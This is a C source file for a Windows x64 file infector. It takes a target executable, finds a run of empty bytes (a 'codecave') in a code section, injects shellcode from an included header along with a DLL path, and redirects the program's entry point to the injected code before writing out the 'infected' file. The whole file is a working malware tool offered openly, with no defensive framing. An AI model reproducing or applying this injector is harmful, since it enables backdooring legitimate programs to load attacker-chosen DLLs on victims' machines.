#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

int main(int argc, char *argv[]) {
	FILE *fp;
	long int fileSize;
	uint8_t *buf, sc[] = 
#include "shellcode.h"	
	;
	size_t dllLen = 0;
	PIMAGE_NT_HEADERS64 ntHeaders;
	PIMAGE_SECTION_HEADER section;
	DWORD i, n;
	int loc = 0;

	if (argc < 4) {
		fprintf(stderr, "Usage:\n\t%s [file to infect] [dll] [output]\n", argv[0]);
		return 1;
	}

	if ((fp = fopen(argv[1], "rb")) == NULL) {
		fprintf(stderr, "[-] Cannot open file: %s\n", argv[1]);
		return 1;
	}

	dllLen = strlen(argv[2]) + 1; //include null byte

	fseek(fp, 0, SEEK_END);
	fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	buf = malloc(fileSize);
	fread(buf, 1, fileSize, fp);
	fclose(fp);

	if (fileSize < (sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64))) {
		fprintf(stderr, "[-] File is too small to be a PE file\n");
		return 1;
	}

	if (((PIMAGE_DOS_HEADER)buf)->e_magic != IMAGE_DOS_SIGNATURE) {
		fprintf(stderr, "[-] Wtf man it's not even a dos executable\n");
		return 1;
	}

	ntHeaders = (PIMAGE_NT_HEADERS64)(buf + ((PIMAGE_DOS_HEADER)buf)->e_lfanew);

	//check if PE
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		fprintf(stderr, "[-] Not a PE file\n");
		return 1;
	}

	//check machine
	if (ntHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
		fprintf(stderr, "[-] Only supporting 64 bit files, who uses 32 bit anyway\n");
		return 1;
	}

	printf("[*] ImageBase: %x\n", ntHeaders->OptionalHeader.ImageBase);
	printf("[*] EntryPoint: %x\n", ntHeaders->OptionalHeader.AddressOfEntryPoint);

	section = IMAGE_FIRST_SECTION(ntHeaders);

	printf("[*] Searching for codecave\n[*] Shellcode size: %u\n", sizeof(sc) + dllLen);

	for (i = section->PointerToRawData, n = 0; i < section->PointerToRawData + section->SizeOfRawData; ++i) {
		if (buf[i] == 0) {
			if (n++ == sizeof(sc) + dllLen) {
				i -= sizeof(sc) + dllLen;
				printf("[+] Codecave at %x in .text\n", i);
				break;
			}
		} else {
			n = 0;
		}
	}

	if (n < sizeof(sc)) {
		loc = 1;
		printf("[-] Codecave not found in .text section\n");

		section = &section[ntHeaders->FileHeader.NumberOfSections - 1];

		printf("[*] Current section: %s\n", section->Name);

		for (i = section->PointerToRawData, n = 0; i < section->PointerToRawData + section->SizeOfRawData; ++i) {
			if (buf[i] == 0) {
				if (n++ == sizeof(sc) + dllLen) {
					i -= sizeof(sc) + dllLen;
					printf("[+] Codecave at %x in %s\n", i, section->Name);
					break;
				}
			} else {
				n = 0;
			}
		}
		
		if (n < sizeof(sc)) {
			printf("[-] Codecave not found in %s section\n", section->Name);
			return 1;
		}
	}


	memcpy(buf + i, sc, sizeof(sc));
	memcpy(buf + i + sizeof(sc), argv[2], dllLen);

	for (n = i; i < n + sizeof(sc); ++i) {
		if (*((uint64_t*)(&buf[i])) == (uint64_t)0xAAAAAAAAAAAAAAAA) {
			*((uint64_t*)(&buf[i])) = ntHeaders->OptionalHeader.AddressOfEntryPoint;
		}
	}

	section->Misc.VirtualSize += sizeof(sc) + dllLen;
	ntHeaders->OptionalHeader.AddressOfEntryPoint = n + section->VirtualAddress - section->PointerToRawData;
	printf("[*] Patched EntryPoint: %p\n", ntHeaders->OptionalHeader.AddressOfEntryPoint);

	if (loc) {
		printf("[*] Current %s characteristics: %x\n", section->Name, section->Characteristics);
		section->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
	}
	
	if ((fp = fopen(argv[3], "wb")) == NULL) {
		fprintf(stderr, "[-] Cannot open file: %s\n", argv[3]);
		return 1;
	}


	fwrite(buf, 1, fileSize, fp);
	fclose(fp);

	free(buf);

	return 0;
}
